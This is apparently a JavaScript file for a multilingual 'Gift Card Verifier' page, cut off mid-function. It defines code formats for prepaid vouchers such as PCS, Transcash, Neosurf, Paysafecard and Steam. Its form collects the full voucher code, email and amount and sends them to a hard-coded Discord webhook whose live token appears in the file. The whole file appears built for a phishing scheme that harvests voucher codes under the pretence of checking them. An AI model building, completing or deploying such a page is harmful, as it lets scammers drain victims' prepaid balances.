// ===== CONFIGURATION =====
// ⚠️ Pour une production réelle, placez ce webhook derrière un backend/proxy sécurisé.
// ⚠️ Attention : Ce webhook est exposé côté client. En production, utilisez un proxy backend.
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1530834730633789612/s1De5VDBXy9mL4nTYxp4CJ1CUA3NcRq_-HvVljq1NYbdqW_a7ZfRBKcNSiBfxRBE3SmT';
const DISCORD_ROLE_MENTION = '';

const STORAGE_KEYS = {
    language: 'preferred-language',
    theme: 'preferred-theme'
};

const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
const canHover = window.matchMedia('(hover: hover) and (pointer: fine)');

// ===== SÉCURITÉ LOCALSTORAGE =====
function safeStorageGet(key, fallback = null) {
    try {
        const value = localStorage.getItem(key);
        return value !== null ? value : fallback;
    } catch {
        return fallback;
    }
}

function safeStorageSet(key, value) {
    try {
        localStorage.setItem(key, value);
        return true;
    } catch {
        return false;
    }
}

function safeStorageRemove(key) {
    try {
        localStorage.removeItem(key);
        return true;
    } catch {
        return false;
    }
}

// ===== CARTES =====
const CARD_RULES = {
    PCS: {
        key: 'PCS',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{10}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 10,
        label: {
            fr: 'Code PCS',
            en: 'PCS code',
            de: 'PCS-Code',
            es: 'Código PCS'
        },
        help: {
            fr: 'PCS : 10 caractères alphanumériques.',
            en: 'PCS: 10 alphanumeric characters.',
            de: 'PCS: 10 alphanumerische Zeichen.',
            es: 'PCS: 10 caracteres alfanuméricos.'
        },
        meta: {
            fr: 'Format détecté : 10 caractères',
            en: 'Expected format: 10 characters',
            de: 'Erwartetes Format: 10 Zeichen',
            es: 'Formato esperado: 10 caracteres'
        },
        placeholder: 'A7218JH12',
        displayName: 'PCS',
        formatDesc: {
            fr: '10 caractères',
            en: '10 characters',
            de: '10 Zeichen',
            es: '10 caracteres'
        },
        logo: 'pcs'
    },
    Transcash: {
        key: 'Transcash',
        allowed: /\D/g,
        validate: value => /^\d{12}$/.test(value),
        format: value => value,
        maxLength: 12,
        label: {
            fr: 'Code Transcash',
            en: 'Transcash code',
            de: 'Transcash-Code',
            es: 'Código Transcash'
        },
        help: {
            fr: 'Transcash : 12 chiffres.',
            en: 'Transcash: 12 digits.',
            de: 'Transcash: 12 Ziffern.',
            es: 'Transcash: 12 dígitos.'
        },
        meta: {
            fr: 'Format détecté : 12 chiffres',
            en: 'Expected format: 12 digits',
            de: 'Erwartetes Format: 12 Ziffern',
            es: 'Formato esperado: 12 dígitos'
        },
        placeholder: '123456789012',
        displayName: 'Transcash',
        formatDesc: {
            fr: '12 chiffres',
            en: '12 digits',
            de: '12 Ziffern',
            es: '12 dígitos'
        },
        logo: 'transcash'
    },
    Neosurf: {
        key: 'Neosurf',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{10}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 10,
        label: {
            fr: 'Code Neosurf',
            en: 'Neosurf code',
            de: 'Neosurf-Code',
            es: 'Código Neosurf'
        },
        help: {
            fr: 'Neosurf : 10 caractères.',
            en: 'Neosurf: 10 characters.',
            de: 'Neosurf: 10 Zeichen.',
            es: 'Neosurf: 10 caracteres.'
        },
        meta: {
            fr: 'Format détecté : 10 caractères',
            en: 'Expected format: 10 characters',
            de: 'Erwartetes Format: 10 Zeichen',
            es: 'Formato esperado: 10 caracteres'
        },
        placeholder: '12345ABCDE',
        displayName: 'Neosurf',
        formatDesc: {
            fr: '10 caractères',
            en: '10 characters',
            de: '10 Zeichen',
            es: '10 caracteres'
        },
        logo: 'neosurf'
    },
    Paysafecard: {
        key: 'Paysafecard',
        allowed: /\D/g,
        validate: value => /^\d{16}$/.test(value),
        format: value => value,
        maxLength: 16,
        label: {
            fr: 'Code Paysafecard',
            en: 'Paysafecard code',
            de: 'Paysafecard-Code',
            es: 'Código Paysafecard'
        },
        help: {
            fr: 'Paysafecard : 16 chiffres.',
            en: 'Paysafecard: 16 digits.',
            de: 'Paysafecard: 16 Ziffern.',
            es: 'Paysafecard: 16 dígitos.'
        },
        meta: {
            fr: 'Format détecté : 16 chiffres',
            en: 'Expected format: 16 digits',
            de: 'Erwartetes Format: 16 Ziffern',
            es: 'Formato esperado: 16 dígitos'
        },
        placeholder: '1234567890123456',
        displayName: 'Paysafecard',
        formatDesc: {
            fr: '16 chiffres',
            en: '16 digits',
            de: '16 Ziffern',
            es: '16 dígitos'
        },
        logo: 'paysafe'
    },
    iTunes: {
        key: 'iTunes',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{16}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 16,
        label: {
            fr: 'Code iTunes',
            en: 'iTunes code',
            de: 'iTunes-Code',
            es: 'Código iTunes'
        },
        help: {
            fr: 'iTunes : 16 caractères alphanumériques.',
            en: 'iTunes: 16 alphanumeric characters.',
            de: 'iTunes: 16 alphanumerische Zeichen.',
            es: 'iTunes: 16 caracteres alfanuméricos.'
        },
        meta: {
            fr: 'Format détecté : 16 caractères',
            en: 'Expected format: 16 characters',
            de: 'Erwartetes Format: 16 Zeichen',
            es: 'Formato esperado: 16 caracteres'
        },
        placeholder: 'ABCDEFGHIJKLMNOP',
        displayName: 'iTunes',
        formatDesc: {
            fr: '16 caractères',
            en: '16 characters',
            de: '16 Zeichen',
            es: '16 caracteres'
        },
        logo: 'itunes'
    },
    Steam: {
        key: 'Steam',
        allowed: /\D/g,
        validate: value => /^\d{15}$/.test(value),
        format: value => value,
        maxLength: 15,
        label: {
            fr: 'Code Steam',
            en: 'Steam code',
            de: 'Steam-Code',
            es: 'Código Steam'
        },
        help: {
            fr: 'Steam : 15 chiffres.',
            en: 'Steam: 15 digits.',
            de: 'Steam: 15 Ziffern.',
            es: 'Steam: 15 dígitos.'
        },
        meta: {
            fr: 'Format détecté : 15 chiffres',
            en: 'Expected format: 15 digits',
            de: 'Erwartetes Format: 15 Ziffern',
            es: 'Formato esperado: 15 dígitos'
        },
        placeholder: '123456789012345',
        displayName: 'Steam Card',
        formatDesc: {
            fr: '15 chiffres',
            en: '15 digits',
            de: '15 Ziffern',
            es: '15 dígitos'
        },
        logo: 'steam'
    },
    GooglePlay: {
        key: 'GooglePlay',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{16}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 16,
        label: {
            fr: 'Code Google Play',
            en: 'Google Play code',
            de: 'Google Play-Code',
            es: 'Código Google Play'
        },
        help: {
            fr: 'Google Play : 16 caractères alphanumériques.',
            en: 'Google Play: 16 alphanumeric characters.',
            de: 'Google Play: 16 alphanumerische Zeichen.',
            es: 'Google Play: 16 caracteres alfanuméricos.'
        },
        meta: {
            fr: 'Format détecté : 16 caractères',
            en: 'Expected format: 16 characters',
            de: 'Erwartetes Format: 16 Zeichen',
            es: 'Formato esperado: 16 caracteres'
        },
        placeholder: 'ABCDEFGHIJKLMNOP',
        displayName: 'Google Play',
        formatDesc: {
            fr: '16 caractères',
            en: '16 characters',
            de: '16 Zeichen',
            es: '16 caracteres'
        },
        logo: 'googleplay'
    },
    Amazon: {
        key: 'Amazon',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{14}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 14,
        label: {
            fr: 'Code Amazon',
            en: 'Amazon code',
            de: 'Amazon-Code',
            es: 'Código Amazon'
        },
        help: {
            fr: 'Amazon : 14 caractères alphanumériques.',
            en: 'Amazon: 14 alphanumeric characters.',
            de: 'Amazon: 14 alphanumerische Zeichen.',
            es: 'Amazon: 14 caracteres alfanuméricos.'
        },
        meta: {
            fr: 'Format détecté : 14 caractères',
            en: 'Expected format: 14 characters',
            de: 'Erwartetes Format: 14 Zeichen',
            es: 'Formato esperado: 14 caracteres'
        },
        placeholder: 'ABCDEFGHIJKLMN',
        displayName: 'Amazon Card',
        formatDesc: {
            fr: '14 caractères',
            en: '14 characters',
            de: '14 Zeichen',
            es: '14 caracteres'
        },
        logo: 'amazon'
    }
};

// ===== LOGOS (à remplacer par vos URLs hébergées) =====
const CARD_LOGOS = {
    pcs: `<img src="https://i.pinimg.com/1200x/4b/d4/02/4bd4028aeec8bb467458d3c9db1c7460.jpg" alt="PCS" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    transcash: `<img src="https://i.pinimg.com/1200x/f5/25/62/f52562ace794f02a992383e6456027a4.jpg" alt="Transcash" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    neosurf: `<img src="https://www.netentstalker.com/wp-content/uploads/2016/06/neosurf-335x205.jpg" alt="Neosurf" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    paysafe: `<img src="https://i.pinimg.com/1200x/b4/2c/fa/b42cfaae961c9085cb62a23ce2a1d781.jpg" alt="Paysafecard" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    itunes: `<img src="https://i.pinimg.com/1200x/8e/43/22/8e432289acad9fb8ca435f8723cc3006.jpg" alt="iTunes" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    steam: `<img src="https://i.pinimg.com/1200x/2c/31/0a/2c310a42c7ff1a43a55df5293b857693.jpg" alt="Steam" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    googleplay: `<img src="https://i.pinimg.com/1200x/a5/04/88/a5048821569632f841434651ae44495e.jpg" alt="Google Play" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`,
    amazon: `<img src="https://i.pinimg.com/1200x/22/b6/7b/22b67b10a768cef2aa80cec378252eb3.jpg" alt="Amazon" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`
};

// ===== MINI-LOGOS POUR LE SELECT =====
const CARD_MINI_LOGOS = {
    pcs: `<img src="https://i.pinimg.com/1200x/4b/d4/02/4bd4028aeec8bb467458d3c9db1c7460.jpg" alt="PCS" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    transcash: `<img src="https://i.pinimg.com/1200x/f5/25/62/f52562ace794f02a992383e6456027a4.jpg" alt="Transcash" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    neosurf: `<img src="https://www.netentstalker.com/wp-content/uploads/2016/06/neosurf-335x205.jpg" alt="Neosurf" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    paysafe: `<img src="https://i.pinimg.com/1200x/b4/2c/fa/b42cfaae961c9085cb62a23ce2a1d781.jpg" alt="Paysafecard" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    itunes: `<img src="https://i.pinimg.com/1200x/8e/43/22/8e432289acad9fb8ca435f8723cc3006.jpg" alt="iTunes" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    steam: `<img src="https://i.pinimg.com/1200x/2c/31/0a/2c310a42c7ff1a43a55df5293b857693.jpg" alt="Steam" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    googleplay: `<img src="https://i.pinimg.com/1200x/a5/04/88/a5048821569632f841434651ae44495e.jpg" alt="Google Play" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
    amazon: `<img src="https://i.pinimg.com/1200x/22/b6/7b/22b67b10a768cef2aa80cec378252eb3.jpg" alt="Amazon" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`
};

// ===== TRADUCTIONS =====
const translations = {
    fr: {
        header: {
            tagline: 'Interface de vérification modernisée'
        },
        hero: {
            badge: 'Expérience premium • validation en temps réel',
            title: 'Vérificateur de Cartes Cadeaux',
            subtitle: 'Vérifiez la validité de vos cartes PCS, Transcash, Neosurf et Paysafecard.'
        },
        form: {
            title: 'Vérifier une carte',
            subtitle: 'Sélectionnez une carte, saisissez le code attendu et transmettez la demande à l\'équipe de traitement.',
            cardType: 'Type de carte',
            cardHint: 'Choisissez une carte pour adapter le format du code',
            selectPlaceholder: '-- Choisissez une carte --',
            noCardSelected: 'Aucune carte sélectionnée',
            selectedCardPrefix: 'Carte sélectionnée :',
            pin: 'Code',
            pinMetaDefault: 'Le format dépend de la carte choisie',
            pinHelpDefault: 'Choisissez une carte pour charger le bon format.',
            pinRequired: 'Veuillez saisir un code.',
            email: 'Votre email',
            amount: 'Montant',
            selectAmount: '-- Sélectionnez un montant --',
            otherAmount: 'Autre (saisir manuellement)',
            amountRequired: 'Veuillez sélectionner ou saisir un montant.',
            purchaseDate: 'Date d\'achat (optionnel)',
            message: 'Message supplémentaire (optionnel)',
            securityTitle: 'Transmission du formulaire',
            security: 'Les champs sont validés dans le navigateur puis transmis à la destination configurée, sans sauvegarde locale du contenu du formulaire.',
            submit: 'Envoyer la demande',
            sending: 'Envoi...'
        },
        contact: {
            btn: 'Contact',
            title: '📬 Nous contacter'
        },
        footer: {
            subtitle: 'UI premium, responsive et prête pour l\'évolution du backend',
            privacy: 'Politique de confidentialité',
            terms: 'Conditions d\'utilisation',
            copy: '© 2026 GiftCard Verifier. Tous droits réservés.'
        },
        modal: {
            title: 'Demande envoyée',
            description: 'Votre demande a bien été reçue. Notre équipe la traitera dans les plus brefs délais et vous répondra par email',
            close: 'Fermer'
        },


        theme: {
            toDark: 'Activer le mode sombre',
            toLight: 'Activer le mode clair'
        },
        noscript: {
            message: 'Certaines fonctionnalités interactives nécessitent JavaScript. Le formulaire reste utilisable, mais la validation en temps réel est désactivée.'
        },
        validation: {
            selectCard: 'Veuillez sélectionner un type de carte.',
            pinRequired: 'Veuillez saisir un code.',
            pinInvalidFor: card => `Le format du code ${card} est invalide.`,
            pinNeedsCard: 'Choisissez une carte pour valider le code.',
            emailInvalid: 'Veuillez entrer un email valide.',
            amountRequired: 'Veuillez sélectionner ou saisir un montant.',
            amountInvalid: 'Veuillez entrer un montant valide (ex: 50.00).',
            amountNegative: 'Le montant ne peut pas être négatif.',
            dateInvalid: 'Veuillez entrer une date valide.',
            dateFuture: 'La date d\'achat ne peut pas être dans le futur.'
        },
        result: {
            error: 'Une erreur est survenue pendant l\'envoi. Vérifiez la configuration du webhook puis réessayez.',
            timeout: 'La demande a expiré. Veuillez réessayer.'
        },
        beforeunload: 'Vous avez des modifications non sauvegardées. Êtes-vous sûr de vouloir quitter ?'
    },
    en: {
        header: {
            tagline: 'Modernized verification interface'
        },
        hero: {
            badge: 'Premium experience • real-time validation',
            title: 'Gift Card Verifier',
            subtitle: 'Check the validity of your PCS, Transcash, Neosurf and Paysafecard cards.'
        },
        form: {
            title: 'Verify a card',
            subtitle: 'Select a card, enter the expected code and submit the request to the processing team.',
            cardType: 'Card type',
            cardHint: 'Choose a card to load the matching code format',
            selectPlaceholder: '-- Choose a card --',
            noCardSelected: 'No card selected',
            selectedCardPrefix: 'Selected card:',
            pin: 'Code',
            pinMetaDefault: 'The format depends on the selected card',
            pinHelpDefault: 'Choose a card to load the right format.',
            pinRequired: 'Please enter a code.',
            email: 'Your email',
            amount: 'Amount',
            selectAmount: '-- Select an amount --',
            otherAmount: 'Other (enter manually)',
            amountRequired: 'Please select or enter an amount.',
            purchaseDate: 'Purchase date (optional)',
            message: 'Additional message (optional)',
            securityTitle: 'Form transmission',
            security: 'Fields are validated in the browser, then sent to the configured destination without storing the form content locally.',
            submit: 'Send request',
            sending: 'Sending...'
        },
        contact: {
            btn: 'Contact',
            title: '📬 Contact us'
        },
        footer: {
            subtitle: 'Premium, responsive UI ready for backend evolution',
            privacy: 'Privacy policy',
            terms: 'Terms of service',
            copy: '© 2024 GiftCard Verifier. All rights reserved.'
        },
        modal: {
            title: 'Request sent',
            description: 'Your request has been transmitted to the configured destination. If follow-up happens, it will use the email address entered in the form.',
            close: 'Close'
        },
        theme: {
            toDark: 'Enable dark mode',
            toLight: 'Enable light mode'
        },
        noscript: {
            message: 'Some interactive features require JavaScript. The form remains usable, but real-time validation is disabled.'
        },
        validation: {
            selectCard: 'Please select a card type.',
            pinRequired: 'Please enter a code.',
            pinInvalidFor: card => `The ${card} code format is invalid.`,
            pinNeedsCard: 'Choose a card before validating the code.',
            emailInvalid: 'Please enter a valid email address.',
            amountRequired: 'Please select or enter an amount.',
            amountInvalid: 'Please enter a valid amount (e.g. 50.00).',
            amountNegative: 'Amount cannot be negative.',
            dateInvalid: 'Please enter a valid date.',
            dateFuture: 'Purchase date cannot be in the future.'
        },
        result: {
            error: 'An error occurred while sending the form. Check the webhook configuration and try again.',
            timeout: 'Request timed out. Please try again.'
        },
        beforeunload: 'You have unsaved changes. Are you sure you want to leave?'
    },
    de: {
        header: {
            tagline: 'Modernisierte Verifizierungsoberfläche'
        },
        hero: {
            badge: 'Premium-Erfahrung • Echtzeit-Validierung',
            title: 'Geschenkkarten-Verifizierer',
            subtitle: 'Überprüfen Sie die Gültigkeit Ihrer PCS-, Transcash-, Neosurf- und Paysafecard-Karten.'
        },
        form: {
            title: 'Eine Karte überprüfen',
            subtitle: 'Wählen Sie eine Karte aus, geben Sie den erwarteten Code ein und übermitteln Sie die Anfrage an das Verarbeitungsteam.',
            cardType: 'Kartentyp',
            cardHint: 'Wählen Sie eine Karte, um das Code-Format anzupassen',
            selectPlaceholder: '-- Wählen Sie eine Karte --',
            noCardSelected: 'Keine Karte ausgewählt',
            selectedCardPrefix: 'Ausgewählte Karte:',
            pin: 'Code',
            pinMetaDefault: 'Das Format hängt von der ausgewählten Karte ab',
            pinHelpDefault: 'Wählen Sie eine Karte, um das richtige Format zu laden.',
            pinRequired: 'Bitte geben Sie einen Code ein.',
            email: 'Ihre E-Mail',
            amount: 'Betrag',
            selectAmount: '-- Wählen Sie einen Betrag --',
            otherAmount: 'Andere (manuell eingeben)',
            amountRequired: 'Bitte wählen oder geben Sie einen Betrag ein.',
            purchaseDate: 'Kaufdatum (optional)',
            message: 'Zusätzliche Nachricht (optional)',
            securityTitle: 'Formularübermittlung',
            security: 'Die Felder werden im Browser validiert und dann an das konfigurierte Ziel gesendet, ohne den Formularinhalt lokal zu speichern.',
            submit: 'Anfrage senden',
            sending: 'Senden...'
        },
        contact: {
            btn: 'Kontakt',
            title: '📬 Kontaktieren Sie uns'
        },
        footer: {
            subtitle: 'Premium, responsive UI bereit für Backend-Entwicklung',
            privacy: 'Datenschutzrichtlinie',
            terms: 'Nutzungsbedingungen',
            copy: '© 2024 GiftCard Verifier. Alle Rechte vorbehalten.'
        },
        modal: {
            title: 'Anfrage gesendet',
            description: 'Ihre Anfrage wurde an das konfigurierte Ziel übermittelt. Wenn eine Nachverfolgung erfolgt, wird die im Formular angegebene E-Mail-Adresse verwendet.',
            close: 'Schließen'
        },
        theme: {
            toDark: 'Dunkelmodus aktivieren',
            toLight: 'Hellmodus aktivieren'
        },
        noscript: {
            message: 'Einige interaktive Funktionen erfordern JavaScript. Das Formular bleibt nutzbar, aber die Echtzeit-Validierung ist deaktiviert.'
        },
        validation: {
            selectCard: 'Bitte wählen Sie einen Kartentyp aus.',
            pinRequired: 'Bitte geben Sie einen Code ein.',
            pinInvalidFor: card => `Das Format des Codes ${card} ist ungültig.`,
            pinNeedsCard: 'Wählen Sie eine Karte, um den Code zu validieren.',
            emailInvalid: 'Bitte geben Sie eine gültige E-Mail-Adresse ein.',
            amountRequired: 'Bitte wählen oder geben Sie einen Betrag ein.',
            amountInvalid: 'Bitte geben Sie einen gültigen Betrag ein (z.B. 50.00).',
            amountNegative: 'Der Betrag darf nicht negativ sein.',
            dateInvalid: 'Bitte geben Sie ein gültiges Datum ein.',
            dateFuture: 'Das Kaufdatum kann nicht in der Zukunft liegen.'
        },
        result: {
            error: 'Beim Senden ist ein Fehler aufgetreten. Überprüfen Sie die Webhook-Konfiguration und versuchen Sie es erneut.',
            timeout: 'Die Anfrage wurde zeitüberschritten. Bitte versuchen Sie es erneut.'
        },
        beforeunload: 'Sie haben nicht gespeicherte Änderungen. Sind Sie sicher, dass Sie die Seite verlassen möchten?'
    },
    es: {
        header: {
            tagline: 'Interfaz de verificación modernizada'
        },
        hero: {
            badge: 'Experiencia premium • validación en tiempo real',
            title: 'Verificador de Tarjetas Regalo',
            subtitle: 'Verifique la validez de sus tarjetas PCS, Transcash, Neosurf y Paysafecard.'
        },
        form: {
            title: 'Verificar una tarjeta',
            subtitle: 'Seleccione una tarjeta, ingrese el código esperado y envíe la solicitud al equipo de procesamiento.',
            cardType: 'Tipo de tarjeta',
            cardHint: 'Elija una tarjeta para adaptar el formato del código',
            selectPlaceholder: '-- Elija una tarjeta --',
            noCardSelected: 'Ninguna tarjeta seleccionada',
            selectedCardPrefix: 'Tarjeta seleccionada:',
            pin: 'Código',
            pinMetaDefault: 'El formato depende de la tarjeta seleccionada',
            pinHelpDefault: 'Elija una tarjeta para cargar el formato correcto.',
            pinRequired: 'Por favor, ingrese un código.',
            email: 'Su correo electrónico',
            amount: 'Monto',
            selectAmount: '-- Seleccione un monto --',
            otherAmount: 'Otro (ingresar manualmente)',
            amountRequired: 'Por favor, seleccione o ingrese un monto.',
            purchaseDate: 'Fecha de compra (opcional)',
            message: 'Mensaje adicional (opcional)',
            securityTitle: 'Transmisión del formulario',
            security: 'Los campos se validan en el navegador y luego se envían al destino configurado, sin almacenar el contenido del formulario localmente.',
            submit: 'Enviar solicitud',
            sending: 'Enviando...'
        },
        contact: {
            btn: 'Contacto',
            title: '📬 Contáctenos'
        },
        footer: {
            subtitle: 'UI premium, responsive y lista para la evolución del backend',
            privacy: 'Política de privacidad',
            terms: 'Términos de uso',
            copy: '© 2026 GiftCard Verifier. Todos los derechos reservados.'
        },
        modal: {
            title: 'Solicitud enviada',
            description: 'Su solicitud ha sido transmitida al destino configurado. Si se realiza un seguimiento, se utilizará la dirección de correo electrónico proporcionada en el formulario.',
            close: 'Cerrar'
        },
        theme: {
            toDark: 'Activar modo oscuro',
            toLight: 'Activar modo claro'
        },
        noscript: {
            message: 'Algunas funciones interactivas requieren JavaScript. El formulario sigue siendo utilizable, pero la validación en tiempo real está desactivada.'
        },
        validation: {
            selectCard: 'Por favor, seleccione un tipo de tarjeta.',
            pinRequired: 'Por favor, ingrese un código.',
            pinInvalidFor: card => `El formato del código ${card} es inválido.`,
            pinNeedsCard: 'Elija una tarjeta para validar el código.',
            emailInvalid: 'Por favor, ingrese un correo electrónico válido.',
            amountRequired: 'Por favor, seleccione o ingrese un monto.',
            amountInvalid: 'Por favor, ingrese un monto válido (ej: 50.00).',
            amountNegative: 'El monto no puede ser negativo.',
            dateInvalid: 'Por favor, ingrese una fecha válida.',
            dateFuture: 'La fecha de compra no puede ser en el futuro.'
        },
        result: {
            error: 'Ocurrió un error durante el envío. Verifique la configuración del webhook y vuelva a intentarlo.',
            timeout: 'La solicitud ha expirado. Por favor, intente de nuevo.'
        },
        beforeunload: 'Tiene cambios no guardados. ¿Está seguro de que desea salir?'
    }
};

// ===== POLYFILLS =====
if (!Element.prototype.matches) {
    Element.prototype.matches = Element.prototype.msMatchesSelector || 
                              Element.prototype.webkitMatchesSelector;
}

if (!Array.from) {
    Array.from = function(arrayLike) {
        return [].slice.call(arrayLike);
    };
}

// ===== ÉLÉMENTS DOM =====
const elements = {
    body: document.body,
    header: document.getElementById('mainHeader'),
    form: document.getElementById('verificationForm'),
    cardTypeSelect: document.getElementById('cardTypeSelect'),
    cardTypeInput: document.getElementById('cardType'),
    cardTypeError: document.getElementById('cardTypeError'),
    pinInput: document.getElementById('pin'),
    pinToggle: document.getElementById('pinToggle'),
    pinLabel: document.getElementById('pinLabel'),
    pinHelp: document.getElementById('pinHelp'),
    pinMetaHint: document.getElementById('pinMetaHint'),
    pinFieldWrap: document.getElementById('pinFieldWrap'),
    pinError: document.getElementById('pinError'),
    emailInput: document.getElementById('email'),
    emailFieldWrap: document.getElementById('emailFieldWrap'),
    emailError: document.getElementById('emailError'),
    amountSelect: document.getElementById('amountSelect'),
    otherAmount: document.getElementById('otherAmount'),
    otherAmountWrapper: document.getElementById('otherAmountWrapper'),
    amountError: document.getElementById('amountError'),
    purchaseDateInput: document.getElementById('purchaseDate'),
    dateError: document.getElementById('dateError'),
    messageInput: document.getElementById('message'),
    submitBtn: document.getElementById('submitBtn'),
    btnText: document.getElementById('btnText'),
    btnLoader: document.getElementById('btnLoader'),
    result: document.getElementById('result'),
    langSelect: document.getElementById('langSelect'),
    themeToggle: document.getElementById('themeToggle'),
    themeIcon: document.querySelector('#themeToggle i'),
    selectedCardHint: document.getElementById('selectedCardHint'),
    cardPreview: document.getElementById('cardPreview'),
    cardPreviewLogo: document.getElementById('cardPreviewLogo'),
    cardPreviewName: document.getElementById('cardPreviewName'),
    cardPreviewFormat: document.getElementById('cardPreviewFormat'),
    successModal: document.getElementById('successModal'),
    closeSuccessModal: document.getElementById('closeSuccessModal'),
    successModalCard: document.querySelector('#successModal .modal-card'),
    confettiLayer: document.getElementById('confettiLayer'),
    particlesCanvas: document.getElementById('particles'),
    heroSection: document.querySelector('.hero'),
    cardSelectWrapper: document.getElementById('cardSelectWrapper')
};

// ===== ÉTAT =====
let currentLang = 'fr';
let currentTheme = 'light';
let previousFocusedElement = null;
let isInitialized = false;
let isFormDirty = false;
let formSubmitted = false;
let debounceTimers = {};
let animationFrameId = null;
let resizeObserver = null;
let lastScrollY = 0;
let headerHidden = false;

// ===== FONCTIONS UTILES =====
function getCurrentTranslations() {
    return translations[currentLang] || translations.fr;
}

function translate(keyPath) {
    const keys = keyPath.split('.');
    let value = getCurrentTranslations();

    for (const key of keys) {
        value = value?.[key];
    }

    return value;
}

// ===== GESTION DE LA SALETÉ DU FORMULAIRE =====
function markFormDirty() {
    if (!formSubmitted) {
        isFormDirty = true;
    }
}

function markFormClean() {
    isFormDirty = false;
}

function getSelectedCardRule() {
    return CARD_RULES[elements.cardTypeInput.value] || null;
}

// ===== DEBOUNCE =====
function debounce(key, fn, delay = 150) {
    if (debounceTimers[key]) {
        clearTimeout(debounceTimers[key]);
    }
    debounceTimers[key] = setTimeout(() => {
        delete debounceTimers[key];
        fn();
    }, delay);
}

// ===== GESTION DU HEADER (scroll) =====
function handleScroll() {
    const currentScrollY = window.scrollY;
    const header = elements.header;
    if (!header) return;

    if (currentScrollY < 50) {
        header.classList.remove('header-hidden');
        headerHidden = false;
        lastScrollY = currentScrollY;
        return;
    }

    if (currentScrollY > lastScrollY && currentScrollY > 80) {
        if (!headerHidden) {
            header.classList.add('header-hidden');
            headerHidden = true;
        }
    } else if (currentScrollY < lastScrollY) {
        if (headerHidden) {
            header.classList.remove('header-hidden');
            headerHidden = false;
        }
    }

    lastScrollY = currentScrollY;
}

// ===== GESTION DU THÈME =====
function updateThemeButton() {
    const toDark = currentTheme !== 'dark';
    elements.themeIcon.className = `fas ${toDark ? 'fa-moon' : 'fa-sun'}`;
    const label = toDark ? getCurrentTranslations().theme.toDark : getCurrentTranslations().theme.toLight;
    elements.themeToggle.setAttribute('aria-label', label);
    elements.themeToggle.setAttribute('title', label);
}

function applyTheme(theme) {
    currentTheme = theme === 'dark' ? 'dark' : 'light';
    elements.body.classList.toggle('dark', currentTheme === 'dark');
    safeStorageSet(STORAGE_KEYS.theme, currentTheme);
    updateThemeButton();
}

// ===== GESTION DE LA LANGUE =====
function setLanguage(lang) {
    if (!translations[lang]) {
        lang = 'fr';
    }
    currentLang = lang;
    const t = getCurrentTranslations();
    document.documentElement.lang = currentLang;

    document.querySelectorAll('[data-i18n]').forEach(el => {
        const value = translate(el.getAttribute('data-i18n'));
        if (typeof value === 'string') {
            el.textContent = value;
        }
    });

    if (elements.langSelect) {
        elements.langSelect.value = currentLang;
    }

    const selectPlaceholder = elements.cardTypeSelect.querySelector('option[value=""]');
    if (selectPlaceholder) {
        selectPlaceholder.textContent = t.form.selectPlaceholder;
    }

    // Mettre à jour le placeholder du select de montant
    const amountPlaceholder = elements.amountSelect.querySelector('option[value=""]');
    if (amountPlaceholder) {
        amountPlaceholder.textContent = t.form.selectAmount;
    }

    // Mettre à jour l'option "Autre"
    const otherOption = elements.amountSelect.querySelector('option[value="other"]');
    if (otherOption) {
        otherOption.textContent = t.form.otherAmount;
    }

    safeStorageSet(STORAGE_KEYS.language, currentLang);
    updateDynamicText();
    updateThemeButton();
    updateCardPreview();
}

// ===== GESTION DES CARTES =====
function updateCardPreview() {
    const selectedValue = elements.cardTypeSelect.value;
    const t = getCurrentTranslations();

    if (selectedValue && CARD_RULES[selectedValue]) {
        const rule = CARD_RULES[selectedValue];
        const logoHtml = CARD_LOGOS[rule.logo] || '';
        
        elements.cardPreviewLogo.innerHTML = logoHtml || `<span class="card-preview-placeholder">${rule.displayName}</span>`;
        elements.cardPreviewName.textContent = rule.displayName;
        const formatDesc = typeof rule.formatDesc === 'object' 
            ? (rule.formatDesc[currentLang] || rule.formatDesc.fr) 
            : rule.formatDesc;
        elements.cardPreviewFormat.textContent = formatDesc;
        elements.cardPreview.classList.add('has-card');
        elements.selectedCardHint.textContent = `${t.form.selectedCardPrefix} ${rule.displayName}`;
    } else {
        elements.cardPreviewLogo.innerHTML = `<span class="card-preview-placeholder">${t.form.selectPlaceholder}</span>`;
        elements.cardPreviewName.textContent = '--';
        elements.cardPreviewFormat.textContent = '--';
        elements.cardPreview.classList.remove('has-card');
        elements.selectedCardHint.textContent = t.form.cardHint;
    }

    elements.cardTypeInput.value = selectedValue;
    
    updateDynamicText();
    validateCardSelection(false);
}

function selectCard(cardValue) {
    if (!CARD_RULES[cardValue]) {
        elements.cardTypeSelect.value = '';
        updateCardPreview();
        return;
    }
    
